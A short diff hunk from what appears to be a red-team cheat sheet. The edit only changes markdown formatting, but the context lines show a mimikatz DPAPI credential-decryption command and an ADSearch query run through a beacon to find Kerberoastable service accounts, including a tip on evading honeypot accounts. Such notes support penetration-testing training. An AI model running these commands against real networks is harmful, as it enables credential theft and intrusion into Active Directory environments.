@@ -1134,8 +1134,7 @@ beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Creden
 ### Kerberos
 
 - Kerberoasting / ASREPRoasting
-    
-    ```powershell
+- ```powershell
     # Kerberosting
     beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
     # To avoid Honeypot accounts, few enumerations can be performed
